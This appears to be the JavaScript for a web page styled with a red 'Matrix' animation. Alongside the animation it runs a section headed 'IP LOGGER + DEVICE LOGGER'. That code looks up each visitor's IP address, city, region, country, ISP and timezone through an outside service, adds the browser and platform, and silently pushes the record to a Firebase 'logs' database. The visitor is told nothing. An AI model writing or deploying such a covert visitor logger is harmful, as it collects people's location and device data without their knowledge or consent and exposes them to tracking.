// Initialize Firebase
const app = firebase.initializeApp(firebaseConfig);
const db = firebase.database();

// Matrix Background Animation
const canvas = document.getElementById("matrixCanvas");
const ctx = canvas.getContext("2d");

canvas.height = window.innerHeight;
canvas.width = window.innerWidth;

const letters = "01X#@$%&";
const fontSize = 16;
const columns = canvas.width / fontSize;

const drops = Array(Math.floor(columns)).fill(1);

function drawMatrix() {
    ctx.fillStyle = "rgba(0, 0, 0, 0.05)";
    ctx.fillRect(0, 0, canvas.width, canvas.height);

    ctx.fillStyle = "red";
    ctx.font = fontSize + "px monospace";

    drops.forEach((y, index) => {
        const text = letters[Math.floor(Math.random() * letters.length)];
        ctx.fillText(text, index * fontSize, y * fontSize);

        if (y * fontSize > canvas.height && Math.random() > 0.975) {
            drops[index] = 0;
        }
        drops[index]++;
    });
}

setInterval(drawMatrix, 35);

// ================================
// IP LOGGER + DEVICE LOGGER
// ================================

document.getElementById("logStatus").innerText = "Fetching IP...";

// Get IP Info
fetch("https://ipapi.co/json/")
    .then(res => res.json())
    .then(data => {
        const userData = {
            ip: data.ip,
            city: data.city,
            region: data.region,
            country: data.country_name,
            isp: data.org,
            timezone: data.timezone,
            browser: navigator.userAgent,
            platform: navigator.platform,
            time: new Date().toString()
        };

        // Save to Firebase
        firebase.database().ref("logs").push(userData);

        document.getElementById("logStatus").innerText =
            "✔ Logged into ReXe Secure Server";
    })
    .catch(() => {
        document.getElementById("logStatus").innerText =
            "❌ Unable to fetch IP";
    });
